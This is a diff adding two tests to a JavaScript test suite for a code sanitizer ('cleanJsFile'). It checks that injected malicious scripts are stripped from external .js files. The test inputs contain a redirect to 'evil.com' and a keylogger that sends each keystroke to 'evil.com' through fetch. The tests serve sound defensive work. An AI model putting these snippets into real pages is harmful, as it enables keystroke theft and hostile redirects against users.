@@ -39,4 +39,19 @@ describe('cleanJsFile — CJS-1: AST перепарсивается после e
     expect(out).toContain('keepMe'); // легит-код сохранён
     expect(out).toContain('console.log');
   });
+
+  it('RED-1: внешний редирект во внешнем .js нейтрализуется', async () => {
+    const out = await runClean(`function go(){} location.href = 'https://evil.com/x'; go();`);
+    expect(out).not.toContain('evil.com');
+    expect(out).toContain('go'); // легит-функция сохранена
+    expect(parseJs(out, 'a.js')).not.toBeNull();
+  });
+
+  it('KEY-1: keylogger во внешнем .js нейтрализуется', async () => {
+    const out = await runClean(
+      `document.addEventListener('keydown', function(e){ fetch('https://evil.com/k?'+e.key); });`,
+    );
+    expect(out).not.toContain('evil.com');
+    expect(parseJs(out, 'a.js')).not.toBeNull();
+  });
 });
